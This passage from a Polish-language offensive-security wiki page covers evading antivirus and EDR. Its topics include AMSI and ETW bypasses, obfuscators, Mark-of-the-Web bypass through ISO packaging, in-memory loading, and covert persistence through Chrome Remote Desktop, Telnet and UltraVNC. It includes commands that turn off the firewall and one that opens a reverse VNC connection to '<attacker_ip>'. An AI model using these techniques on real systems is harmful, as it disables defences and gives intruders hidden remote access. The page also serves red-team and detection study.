- Stosowane w loaderach uruchamianych przez LOLBins (np. `regsvr32` wywołujący `DllRegisterServer`).

Narzędzie **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** również generuje skrypt do obejścia AMSI.
Narzędzie **[https://amsibypass.com/](https://amsibypass.com/)** również generuje skrypt do obejścia AMSI, który unika wykrycia przez sygnatury dzięki losowo generowanej funkcji zdefiniowanej przez użytkownika, zmiennym i wyrażeniom znakowym oraz losowej zmianie wielkości liter w słowach kluczowych PowerShell.

**Usuń wykrytą sygnaturę**

Możesz użyć narzędzia takiego jak **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, aby usunąć wykrytą sygnaturę AMSI z pamięci bieżącego procesu. Narzędzie skanuje pamięć bieżącego procesu w poszukiwaniu sygnatury AMSI, a następnie nadpisuje ją instrukcjami NOP, skutecznie usuwając ją z pamięci.

**Produkty AV/EDR korzystające z AMSI**

Listę produktów AV/EDR korzystających z AMSI znajdziesz pod adresem **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Użyj PowerShell w wersji 2**
Jeśli użyjesz PowerShell w wersji 2, AMSI nie zostanie załadowany, więc możesz uruchamiać skrypty bez skanowania ich przez AMSI. Możesz to zrobić:

```bash
powershell.exe -version 2
```

## Rejestrowanie PowerShell

Rejestrowanie PowerShell to funkcja, która pozwala zapisywać wszystkie polecenia PowerShell wykonywane w systemie. Może być przydatna do audytowania i rozwiązywania problemów, ale może też stanowić **problem dla atakujących, którzy chcą uniknąć wykrycia**.

Aby ominąć rejestrowanie PowerShell, możesz użyć następujących technik:

- **Wyłącz transkrypcję PowerShell i rejestrowanie modułów**: Możesz w tym celu użyć narzędzia takiego jak [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Użyj PowerShell w wersji 2**: Jeśli użyjesz PowerShell w wersji 2, AMSI nie zostanie załadowane, dzięki czemu możesz uruchamiać skrypty bez skanowania przez AMSI. Możesz to zrobić tak: `powershell.exe -version 2`
- **Użyj niezarządzanej sesji PowerShell**: Użyj [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), aby hostować PowerShell bez uruchamiania `powershell.exe` (takie podejście wykorzystuje `powerpick` z Cobalt Strike). Pozwala to ominąć mechanizmy kontroli powiązane konkretnie z procesem `powershell.exe`, ale samo w sobie nie wyłącza AMSI, Script Block Logging ani innych zabezpieczeń PowerShell; zakres ochrony zależy od środowiska uruchomieniowego i implementacji hosta.


## Zaciemnianie

> [!TIP]
> Kilka technik zaciemniania polega na szyfrowaniu danych, co zwiększa entropię pliku binarnego i ułatwia jego wykrywanie przez AV i EDR. Zachowaj ostrożność i rozważ szyfrowanie tylko wybranych fragmentów kodu, które są wrażliwe lub powinny pozostać ukryte.

### Deobfuskacja plików binarnych .NET chronionych przez ConfuserEx

Podczas analizy malware wykorzystującego ConfuserEx 2 (lub jego komercyjne forki) często można napotkać kilka warstw zabezpieczeń, które blokują dekompilatory i sandboxy. Poniższy proces niezawodnie **przywraca IL zbliżone do oryginału**, które można następnie zdekompilować do C# za pomocą narzędzi takich jak dnSpy lub ILSpy.<sup>[[10]](#references)</sup>

1.  Usuwanie ochrony przed modyfikacjami – ConfuserEx szyfruje każde *ciało metody* i odszyfrowuje je w statycznym konstruktorze *modułu* (`<Module>.cctor`). Modyfikuje też sumę kontrolną PE, przez co każda zmiana powoduje awarię pliku binarnego. Użyj **AntiTamperKiller**, aby zlokalizować zaszyfrowane tabele metadanych, odzyskać klucze XOR i zapisać czyste zestawienie:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Dane wyjściowe zawierają 6 parametrów anti-tamper (`key0-key3`, `nameHash`, `internKey`), które mogą być przydatne przy tworzeniu własnego unpackera.

2.  Odzyskiwanie symboli / przepływu sterowania – przekaż *czysty* plik do **de4dot-cex** (forka de4dot obsługującego ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – wybiera profil ConfuserEx 2
     • de4dot cofnie control-flow flattening, przywróci oryginalne przestrzenie nazw, klasy i nazwy zmiennych oraz odszyfruje ciągi znaków będące stałymi.

3.  Proxy-call stripping – ConfuserEx zastępuje bezpośrednie wywołania metod lekkimi wrapperami (tzw. *proxy calls*), aby jeszcze bardziej utrudnić dekompilację. Usuń je za pomocą **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Po tym kroku powinny być widoczne standardowe API .NET, takie jak `Convert.FromBase64String` lub `AES.Create()`, zamiast nieczytelnych funkcji opakowujących (`Class8.smethod_10`, …).

4.  Ręczne czyszczenie – uruchom wynikowy plik binarny w dnSpy i wyszukaj duże ciągi Base64 lub użycie `RijndaelManaged`/`TripleDESCryptoServiceProvider`, aby znaleźć *prawdziwy* payload.  Często malware przechowuje go jako tablicę bajtów zakodowaną w formacie TLV, inicjalizowaną wewnątrz `<Module>.byte_0`.

Powyższy łańcuch przywraca przepływ wykonywania **bez** konieczności uruchamiania złośliwego pliku – przydatne podczas pracy na stacji roboczej bez dostępu do sieci.

> 🛈  ConfuserEx tworzy atrybut niestandardowy o nazwie `ConfusedByAttribute`, którego można użyć jako IOC do automatycznej wstępnej klasyfikacji próbek.

#### Jednolinijkowiec
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuscator C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Celem tego projektu jest stworzenie otwartoźródłowej gałęzi pakietu kompilacyjnego [LLVM](http://www.llvm.org/), która zwiększa bezpieczeństwo oprogramowania dzięki [obfuskacji kodu](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i ochronie przed manipulacją.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstruje, jak używać języka `C++11/14` do generowania obfuskowanego kodu podczas kompilacji, bez użycia zewnętrznych narzędzi i bez modyfikowania kompilatora.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje warstwę obfuskowanych operacji generowanych przez framework metaprogramowania szablonów C++, co nieco utrudnia życie osobie próbującej złamać aplikację.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz to obfuscator binarnych plików x64, który potrafi obfuskować różne pliki PE, w tym: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame to prosty silnik kodu metamorphic dla dowolnych plików wykonywalnych.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator to framework do precyzyjnej obfuskacji kodu dla języków obsługiwanych przez LLVM, wykorzystujący ROP (programowanie zorientowane na powroty). ROPfuscator obfuskowuje program na poziomie kodu asemblera, przekształcając zwykłe instrukcje w łańcuchy ROP, co podważa nasze naturalne wyobrażenie o normalnym przepływie sterowania.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt to Crypter .NET PE napisany w Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor potrafi konwertować istniejące pliki EXE/DLL do shellcode, a następnie je ładować

### Samomaskowanie poszczególnych funkcji wspomagane przez kompilator LLVM

Zamiast maskować cały implant tylko podczas uśpienia, zmodyfikowany backend LLVM X86 może utrzymywać wybrane funkcje zamaskowane operacją XOR, gdy są nieaktywne. PoC Function Peekaboo wybiera nazwy po demanglingu zawierające `REG_`, wstawia niezależne od położenia stuby wejścia/wyjścia wokół końcowego kodu maszynowego i emituje jeden wspólny handler maskujący w `.text`; sygnatury na poziomie źródłowym i konwencja wywołań Windows x64 pozostają niezmienione.<sup>[[38]](#references)[[39]](#references)</sup>

#### Transformacja przepływu sterowania w backendzie

Transformację należy wykonać po wyborze instrukcji i optymalizacji, ponieważ musi obejmować **każdą wygenerowaną instrukcję powrotu** i znać dokładny układ x86. Przed emisją kodu `MachineFunctionPass` wyszukuje ostatnią instrukcję `MachineInstr::isReturn()`, usuwa ją, aby końcowa ścieżka przechodziła do dopisanego epilogu, a wcześniejsze instrukcje powrotu zastępuje przez `JMP_1 handler`. Należy zachować wygenerowane przez kompilator operacje zwalniania stosu/ramki poprzedzające każdą instrukcję powrotu; przekierować należy tylko samą instrukcję powrotu.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` i `emitFunctionBodyEnd()` emitują stuby poszczególnych funkcji, a `emitEndOfAsmFile()` emituje handler. Symbole współdzielone między etapami emisji pozwalają skokowi z prologu wskazywać późniejszy epilog; w przypadku ręcznie emitowanego bliskiego `je` należy zapisać `0F 84`, a następnie czterobajtowe wyrażenie MC `target - address_after_je`. Wywołania i skoki do handlera można natomiast emitować jako obiekty `MCInst` (`CALL64pcrel32` i `JMP_1`). Pass musi zwrócić `false` dla niewybranej funkcji, jeśli niczego nie zmienił; PoC błędnie zwraca w tej sytuacji `true`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadane i inicjalizacja przed CRT

PoC umieszcza klucz XOR i 16-bajtowe rekordy zawierające wskaźnik do funkcji z poprawką relokacyjną loadera oraz długość ustalaną w czasie działania w `.funcmeta`. Chociaż pole C ma typ `uint32_t`, handler odczytuje QWORD z przesunięcia `+8` w rekordzie, obejmujący długość i jej dopełnienie, a rekordy przetwarza co `0x10` bajtów. Nazwy sekcji PE mają długość najwyżej ośmiu bajtów, więc podczas wyszukiwania w czasie działania widoczna jest nazwa `.funcmet`. Zewnętrzny patcher dodaje wykonywalną sekcję `.stub`, zapisuje w niej poprzedni RVA punktu wejścia i przekierowuje `AddressOfEntryPoint`; stub PIC pobiera bazę obrazu z `gs:[0x60]` → `[PEB+0x10]`, przegląda importy PE32+, aby znaleźć już zaimportowaną funkcję `VirtualProtect`, i uruchamia się przed CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Inicjalizacja ustawia znacznik w `gs:[0xE8]` i wywołuje każdą funkcję z metadanych. Jej stale czytelny prolog zapisuje początek funkcji w `gs:[0xF0]`, wykrywa znacznik i pomija wciąż niezamaskowane ciało. Epilog używa następnie `call handler`; po zapisaniu przez handler 13 rejestrów (`0x68` bajtów) adres powrotu pod `[rsp+0x68]` jest końcem przekształconej funkcji, dlatego można zapisać `end - start` w jej rekordzie metadanych. Stub usuwa znacznik i po zamaskowaniu wszystkich ciał wykonuje skok do `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Podczas zwykłego wywołania prolog wywołuje ten sam symetryczny handler, aby zdekodować ciało funkcji. Końcowa ścieżka przechodzi do dopisanego epilogu, a każde wcześniejsze miejsce powrotu skacze bezpośrednio do wspólnego handlera. Zwykły epilog również używa `jmp handler` zamiast `call`, więc po ponownym zamaskowaniu funkcji instrukcja `ret` handlera pobiera adres powrotu oryginalnego wywołującego, zachowując wynik funkcji w `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Prymityw maskujący i wskaźniki analityczne

Handler odnajduje bieżący rekord, pomija stały, widoczny prolog (w tej kompilacji `0x46` bajtów), zmienia pozostałą część na `PAGE_EXECUTE_READWRITE`, wykonuje XOR każdego bajtu z najmłodszym bajtem klucza, a następnie ustawia ochronę `PAGE_EXECUTE_READ`. Ta sama pętla dekoduje więc kod przy wejściu i koduje go przy każdym zwykłym wyjściu.<sup>[[38]](#references)[[39]](#references)</sup>

Wskaźniki o wysokiej wartości diagnostycznej dla tego rozwiązania obejmują:<sup>[[38]](#references)[[39]](#references)</sup>

- punkt wejścia wewnątrz wykonywalnej sekcji `.stub` oraz sekcję `.funcmet` zawierającą klucz i relokowane wskaźniki do `.text`;
- parsowanie PEB, tabeli importów i tabeli sekcji przed CRT, a następnie wywołania za pośrednictwem każdego wskaźnika z metadanych;
- identyczne prologi PIC `call`/`pop` oraz wiele miejsc powrotu przekierowanych do jednego handlera;
- zapisy do `gs:[0xE8]`, `gs:[0xF0]` i `gs:[0xF8]`, po których następują powtarzające się zmiany ochrony przez `VirtualProtect` i zapisy bajtów XOR do wspieranych przez obraz stron wykonywalnych.

To unikanie skanerów pamięci, a nie ochrona kryptograficzna: spatchowany plik nadal zawiera oryginalne, niezamaskowane ciało, a debugger może zatrzymać się na `VirtualProtect` lub pętli XOR i zrzucić aktywną funkcję. Jednobajtowy XOR, czytelne metadane i stała granica `0x46` ułatwiają również odzyskanie kodu offline.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Sloty TEB w PoC są lokalne dla wątku, ale zmodyfikowane strony kodu są wspólne dla procesu. Równoczesne lub rekurencyjne wejście może zatem ponownie przełączać instrukcje, gdy inna instancja funkcji jest w trakcie wykonywania; wyjątki i nielokalne wyjścia również mogą ominąć ponowne maskowanie. Solidna implementacja musi synchronizować zmiany, przywracać ochronę faktycznie zwróconą przez `lpflOldProtect`, unikać zakodowanych na stałe długości stubów, sprawdzać ścieżki `call` i `jmp` pod kątem wyrównania stosu x64 oraz wywoływać `FlushInstructionCache` po przepisaniu wykonywalnych bajtów. Microsoft wyraźnie wskazuje, że zapewnienie spójności cache’u instrukcji po modyfikacji kodu wykonywalnego należy do wywołującego.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen i MoTW

Być może widziałeś ten ekran podczas pobierania niektórych plików wykonywalnych z internetu i ich uruchamiania.

Microsoft Defender SmartScreen to mechanizm bezpieczeństwa, którego celem jest ochrona użytkownika końcowego przed uruchamianiem potencjalnie złośliwych aplikacji.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen działa głównie w oparciu o reputację, co oznacza, że rzadko pobierane aplikacje wywołają SmartScreen, który ostrzeże użytkownika końcowego i uniemożliwi mu uruchomienie pliku (plik nadal można uruchomić, klikając More Info -> Run anyway).

**MoTW** (Mark of The Web) to [alternatywny strumień danych NTFS](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) o nazwie Zone.Identifier, który jest automatycznie tworzony podczas pobierania plików z internetu wraz z adresem URL, z którego zostały pobrane.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Sprawdzanie ADS Zone.Identifier pliku pobranego z internetu.</p></figcaption></figure>

> [!TIP]
> Warto pamiętać, że pliki wykonywalne podpisane **zaufanym** certyfikatem podpisu **nie wywołają SmartScreen**.

Bardzo skutecznym sposobem zapobiegania nadaniu payloadom Mark of The Web jest spakowanie ich w kontener, na przykład ISO. Dzieje się tak, ponieważ Mark-of-the-Web (MOTW) **nie może** zostać zastosowany do woluminów **innych niż NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) to narzędzie, które pakuje payloady do kontenerów wyjściowych, aby ominąć Mark-of-the-Web.

Przykładowe użycie:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Here is a demo pokazujące, jak ominąć SmartScreen, pakując payloady w plikach ISO za pomocą [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) to zaawansowany mechanizm rejestrowania zdarzeń w systemie Windows, który umożliwia aplikacjom i komponentom systemu **rejestrowanie zdarzeń**. Produkty zabezpieczające mogą go jednak również używać do monitorowania i wykrywania złośliwych działań.

Podobnie jak AMSI można wyłączyć (ominąć), można też sprawić, by funkcja **`EtwEventWrite`** procesu w przestrzeni użytkownika natychmiast zwracała wynik, nie rejestrując żadnych zdarzeń. Osiąga się to przez załatanie funkcji w pamięci, tak aby natychmiast zwracała wynik, co skutecznie wyłącza rejestrowanie ETW dla danego procesu.

Więcej informacji znajdziesz w **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) i [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## Refleksja assembly C#

Ładowanie plików binarnych C# do pamięci jest znane od dawna i nadal stanowi świetny sposób na uruchamianie narzędzi post-exploitation bez wykrycia przez AV.

Ponieważ payload zostanie załadowany bezpośrednio do pamięci, bez zapisywania go na dysku, wystarczy nam załatać AMSI dla całego procesu.

Większość frameworków C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc itd.) umożliwia już bezpośrednie uruchamianie assembly C# w pamięci, ale można to zrobić na różne sposoby:

- **Fork\&Run**

Polega to na **uruchomieniu nowego procesu ofiarnego**, wstrzyknięciu do niego złośliwego kodu post-exploitation, wykonaniu tego kodu, a po zakończeniu — zamknięciu nowego procesu. Ta metoda ma zarówno zalety, jak i wady. Jej zaletą jest to, że wykonanie odbywa się **poza** procesem naszego implantu Beacon. Oznacza to, że jeśli podczas działań post-exploitation coś pójdzie nie tak lub zostanie wykryte, **znacznie wzrasta szansa**, że nasz **implant przetrwa**. Wadą jest **większe prawdopodobieństwo** wykrycia przez **detekcje behawioralne**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Polega to na wstrzyknięciu złośliwego kodu post-exploitation **do własnego procesu**. Dzięki temu nie trzeba tworzyć nowego procesu, który zostałby przeskanowany przez AV. Wadą jest jednak **znacznie większe ryzyko** **utraty beacona**, ponieważ błąd podczas wykonywania payloadu może spowodować awarię procesu.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Jeśli chcesz dowiedzieć się więcej o ładowaniu assembly C#, przeczytaj ten artykuł [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) oraz zapoznaj się z ich InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Możesz też ładować assembly C# **z PowerShella**. Sprawdź [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) oraz [wideo S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Przepakowywanie narzędzi .NET do WebAssembly z NativeAOT (WasmForge)

Standardowe techniki `execute-assembly` zachowują rozpoznawalny kod MSIL i ostatecznie inicjalizują CLR. **WasmForge** zmienia natomiast środowisko wykonawcze: przenosi projekt C# na eksperymentalny cel NativeAOT-LLVM WASI, kompiluje go z wyprzedzeniem do WebAssembly i osadza ten moduł w hoście Windows PE opartym na Wazero. Powstały proces nie wymaga CLR, JIT ani hosta `dotnet` na maszynie docelowej, dlatego reguły oparte wyłącznie na nazwach zarządzanych assembly, ładowaniu CLR, AMSI lub .NET ETW tracą bezpośrednią widoczność. Jest to technika unikania wykrycia i pakowania, a nie obejście granicy uprawnień — proces gościa zachowuje uprawnienia oryginalnego narzędzia oraz jego obserwowalne zachowanie w systemie operacyjnym.<sup>[[44]](#references)[[45]](#references)</sup>

### Budowanie projektu C#

Zalecaną metodą budowania jest środowisko Docker projektu, które zawiera .NET 10 SDK, workload NativeAOT-LLVM, WASI SDK 24.0, linker i zależności wymagane do podpisywania. Plik `.csproj` jest wykrywany automatycznie; pojedyncze polecenie budowania przeprowadza migrację, poprawki zgodności, kompilację WASM, tworzenie pliku PE i podpisywanie.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

W przypadku rozwiązywania problemów lub przeglądania wygenerowanego kodu podziel proces na `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` i końcowe `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Obraz builda używa też wrappera `wasm-component-ld`, który pozwala uniknąć kodowania komponentów WASI Preview 2 i wygenerować zwykły moduł oczekiwany przez osadzony runtime.<sup>[[44]](#references)[[45]](#references)</sup>

### Mostkowanie wasm32 C# z x64 Win32

Nie jest to przezroczysta rekompilacja. NativeAOT-WASI nie obsługuje niektórych funkcji BCL związanych z Windows lub zmienia ich działanie, a gość wasm32 zwykle przydziela czterobajtowe sloty wskaźników, podczas gdy API x64 mogą zwracać wskaźniki ośmiobajtowe. WasmForge rozwiązuje oba problemy za pomocą następujących wygenerowanych warstw:<sup>[[44]](#references)</sup>

1. Patcher kodu źródłowego naprawia różnice semantyczne specyficzne dla AOT i przekierowuje nieobsługiwane wywołania dotyczące rejestru, potoków, WMI, tożsamości, usług katalogowych, wersji plików, LSA i podobnych funkcji do helperów `Wf*`.
2. Skaner P/Invoke generuje mapowania NativeAOT `DirectPInvoke`, dzięki którym wywołania `[DllImport]` wiążą się z połączonymi symbolami mostka C zamiast dynamicznie ładować zadeklarowaną bibliotekę DLL wewnątrz gościa.
3. Wskaźniki przekazywane do hosta używają typu `ulong` w C# i `uint64_t` w C. Ogólny dispatcher przekazuje wywołanie do handlera Win32 hosta; `out8_mask` oznacza rzeczywiste ośmiobajtowe sloty wyjściowe, których górne połowy należy zachować. Niezaznaczone wyjścia o układzie wasm32 są chronione przez mechanizm snapshot/restore, dzięki czemu zapis x64 nie uszkodzi sąsiednich czterech bajtów.
4. Dedykowane mostki hosta obsługują operacje, które nie pasują do ogólnego dispatchu syscalli, takie jak dostęp do cache biletów LSA, operacje Kerberos/BCrypt ze strukturalnymi wynikami, ruch TCP KDC i zapytania LDAP.

Na przykład wrapper dla `version.dll!VerQueryValueW` przekazuje cztery adresy hosta i ustawia bity 2 i 3 (`0xC`), ponieważ wskaźnik wartości i długość to ośmiobajtowe sloty wyjściowe. Sam wrapper pozostaje ogólny i przekazuje nazwę DLL, nazwę eksportu, argumenty oraz maskę do `wf_call_v2`; host tłumaczy wskaźniki i wywołuje natywne API.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Ograniczenia i punkty zwrotne detekcji

Kod intensywnie wykorzystujący reflection, dynamiczne ładowanie assembly, dowolne natywne callbacki i złożone struktury x64 zwracane do pamięci WASM nadal może wymagać poprawek dostosowanych do danego narzędzia lub całkowicie zawieść. Ogólne gniazda WASI Preview 2 mogą również trafiać do stubów no-op, dlatego obsługiwane narzędzia korzystają z host shims specyficznych dla danego protokołu. Weryfikuj każde polecenie w natywnej kompilacji, zamiast zakładać równoważność funkcji.<sup>[[44]](#references)[[45]](#references)</sup>

Ta technika zmienia telemetrię, zamiast czynić payload niewidocznym. Detekcja może skupić się na pliku PE zawierającym moduł WASM lub tworzącym go w pamięci, zachowaniu przypominającym runtime Wazero, nietypowej alokacji i kopiowaniu pamięci host/guest, ogólnym bezpośrednim wywoływaniu Win32, anomaliach związanych z podpisem i zasobami PE, a także na wynikowych wywołaniach API i ruchu sieciowym. Brak zdarzeń CLR-load, AMSI lub .NET ETW nie powinien być zatem traktowany jako dowód, że proces jest nieszkodliwy.<sup>[[44]](#references)</sup>

## Używanie innych języków programowania

Jak zaproponowano w [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), można wykonywać złośliwy kod w innych językach, zapewniając przejętemu komputerowi dostęp **do środowiska interpretera zainstalowanego na udziale SMB kontrolowanym przez atakującego**.

Zapewniając dostęp do plików binarnych interpretera i środowiska na udziale SMB, możesz **wykonywać dowolny kod w tych językach w pamięci** przejętego komputera.

Repozytorium wskazuje: Defender nadal skanuje skrypty, ale wykorzystanie Go, Java, PHP itd. daje nam **większą elastyczność w omijaniu sygnatur statycznych**. Testy losowych, nieobfuskowanych skryptów reverse shell w tych językach zakończyły się powodzeniem.

## Re-hosting WebAssembly w celu uniknięcia analizy statycznej

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping manipuluje tokenem dostępu produktu zabezpieczającego, takiego jak EDR lub AV. Ograniczenie uprawnień tokenu może pozostawić proces uruchomiony, jednocześnie uniemożliwiając mu wykonywanie uprzywilejowanych działań inspekcyjnych lub naprawczych.

Aby temu zapobiec, Windows może **uniemożliwić zewnętrznym procesom** uzyskiwanie uchwytów do tokenów procesów zabezpieczających.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Używanie zaufanego oprogramowania

### Chrome Remote Desktop

Jak opisano w [**tym wpisie na blogu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), łatwo jest wdrożyć Chrome Remote Desktop na komputerze ofiary, a następnie użyć go do przejęcia kontroli nad nim i utrzymania persistence:<sup>[[35]](#references)</sup>
1. Pobierz program ze strony https://remotedesktop.google.com/, kliknij „Set up via SSH”, a następnie kliknij plik MSI dla systemu Windows, aby go pobrać.
2. Uruchom instalator po cichu na komputerze ofiary (wymagane uprawnienia administratora): `msiexec /i chromeremotedesktophost.msi /qn`
3. Wróć na stronę Chrome Remote Desktop i kliknij „Next”. Kreator poprosi o autoryzację; kliknij przycisk „Authorize”, aby kontynuować.
4. Wykonaj podane polecenie, wprowadzając wymagane zmiany: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parametr `--pin` ustawia PIN bez użycia GUI).
 

## Advanced Evasion

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Evasion to bardzo złożony temat. Czasami trzeba uwzględnić wiele różnych źródeł telemetrii w jednym systemie, więc pozostanie całkowicie niewykrytym w dojrzałych środowiskach jest praktycznie niemożliwe.

Każde środowisko, w którym będziesz działać, ma swoje mocne i słabe strony.

Zachęcam do obejrzenia tego wystąpienia [@ATTL4S](https://twitter.com/DaniLJ94), aby poznać podstawy bardziej zaawansowanych technik Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

To także świetne wystąpienie [@mariuszbit](https://twitter.com/mariuszbit) o Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Stare techniki**

### **Sprawdź, które części Defender uznaje za złośliwe**

Możesz użyć [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), które będzie **usuwać części pliku binarnego**, aż **ustali, którą część Defender** uznaje za złośliwą, a następnie wyodrębni ją dla Ciebie.\
Innym narzędziem wykonującym **to samo jest** [**avred**](https://github.com/dobin/avred), które udostępnia tę usługę w otwartym Internecie pod adresem [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Serwer Telnet**

Do Windows 10 wszystkie wersje Windows zawierały **serwer Telnet**, który można było zainstalować (jako administrator), wykonując:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Ustaw, aby uruchamiał się przy starcie systemu, i uruchom go teraz:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Zmień port Telnetu** (stealth) i wyłącz zaporę:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Pobierz z: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (potrzebujesz plików binarnych do pobrania, a nie instalatora)

**NA HOŚCIE**: Uruchom _**winvnc.exe**_ i skonfiguruj serwer:

- Włącz opcję _Disable TrayIcon_
- Ustaw hasło w _VNC Password_
- Ustaw hasło w _View-Only Password_

Następnie przenieś plik binarny _**winvnc.exe**_ oraz **nowo** utworzony plik _**UltraVNC.ini**_ na komputer **ofiary**

#### **Połączenie zwrotne**

**Atakujący** powinien **uruchomić na swoim hoście** plik binarny `vncviewer.exe -listen 5900`, aby był **gotowy** do odebrania zwrotnego **połączenia VNC**. Następnie, na komputerze **ofiary**: uruchom demona winvnc za pomocą `winvnc.exe -run` i wykonaj `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**OSTRZEŻENIE:** Aby zachować ukrycie, nie wolno robić kilku rzeczy

